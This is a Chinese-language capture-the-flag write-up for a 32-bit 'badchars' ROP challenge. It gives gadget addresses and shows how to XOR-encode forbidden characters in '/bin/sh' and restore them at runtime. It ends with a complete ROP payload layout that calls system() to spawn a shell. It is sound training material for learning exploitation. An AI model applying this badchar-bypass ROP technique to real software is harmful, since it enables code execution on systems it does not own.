## Reverse
和前一题 3-write4 差不多，只是这次又多了 badchars 检测，我们的 payload 不能包含以下任何一个字元：
```
badchars are: b i c / <space> f n s
```

先来看看 ROP Gadgets 有哪些可以用的。

<br>

## ROP Gadgets
这次我们发现可利用的 gadgets 有四个：
```
(1) 0x08048893 : mov dword ptr [edi], esi ; ret
(2) 0x08048899 : pop esi ; pop edi ; ret
(3) 0x08048890 : xor byte ptr [ebx], cl ; ret
(4) 0x08048896 : pop ebx ; pop ecx ; ret
```

Gadget3 有个 xor，我们可以利用 xor cipher 的特性，在 bof 时先把 payload 中的 badchars 替换成程式允许的字元。
```
let xor_key = 5
let 3 be a badchar
let 6 be an allowed char

3 ^ xor_key = 6
6 ^ xor_key = 3
```

到之后 ROP Chain 开始运行时，再利用 xor 把 badchars 还原回来。

<br>

## Pwn
具体细节都和上一题差不多，只是 ROP Chain 里多了通过 xor 还原 badchars 的流程，此处不赘述。

设计 payload：
```
11 * 'AAAA' +
gadget2     + '/bin'    + buf       + gadget1 +
gadget2     + '/sh\x00' + (buf + 4) + gadget1 +
gadget4     + (buf+0)   + xor_key   + gadget3 +
gadget4     + (buf+1)   + xor_key   + gadget3 +
gadget4     + (buf+2)   + xor_key   + gadget3 +
gadget4     + (buf+3)   + xor_key   + gadget3 +
gadget4     + (buf+4)   + xor_key   + gadget3 +
gadget4     + (buf+5)   + xor_key   + gadget3 +
system_plt  + 'AAAA'    + buf
```

xor_key 我直接选 0x3（瞎挑的），然后 xor 过后的字元都刚好不在 badchars 内 （汗），所以就选 0x3 吧。

中间 gadget4 ... gadget3 那几行，因为 `/bin/sh\x00` 刚好前6个字都是 badchars，后面的都是 goodchars，所以这边刚好是 +0 ~ +5

至于 buf 的位址要选用哪个，就一样通过 `readelf -S badchars` 列出程式的所有 sections，然后找到一个可写的当 buf 来存放 "/bin/sh\x00"。
